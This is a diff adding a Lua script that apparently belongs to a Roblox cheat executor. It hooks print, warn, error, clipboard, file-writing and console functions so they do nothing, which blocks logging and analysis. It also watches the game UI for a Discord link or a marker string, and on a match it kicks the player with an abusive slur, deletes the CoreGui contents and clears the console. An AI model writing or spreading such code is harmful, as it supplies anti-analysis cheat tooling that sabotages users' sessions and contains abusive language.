@@ -1,0 +1,62 @@
+if hookfunc or hookfunction then
+    h = hookfunc or hookfunction
+    n = setclipboard or toclipboard or clipboard
+    h(
+        print,
+        function()
+            return
+        end
+    )
+    h(
+        n,
+        function()
+            return
+        end
+    )
+    h(
+        writefile,
+        function()
+            return
+        end
+    )
+    h(
+        makefolder,
+        function()
+            return
+        end
+    )
+    h(
+        rconsoleprint,
+        function()
+            return
+        end
+    )
+    h(
+        warn,
+        function()
+            return
+        end
+    )
+    h(
+        error,
+        function()
+            return
+        end
+    )
+end
+
+game.DescendantAdded:Connect(
+    function(v)
+        if v.IsA(v, "TextLabel") or v.IsA(v, "TextButton") or v.IsA(v, "TextBox") then
+            if string.match(string.lower(v.Text), "https://www.dis") or string.match(v.Text, "p5clQlrBUDE") then
+                game.Players.LocalPlayer.Kick(game.Players.LocalPlayer,"fuck off retard")
+                error("...")
+                game.Players.LocalPlayer:Kick("fuck off retard")
+                for i,v in next, game.CoreGui:GetChildren() do
+                   v:Destroy()
+                end
+                rconsoleclear()
+            end
+        end
+    end
+)
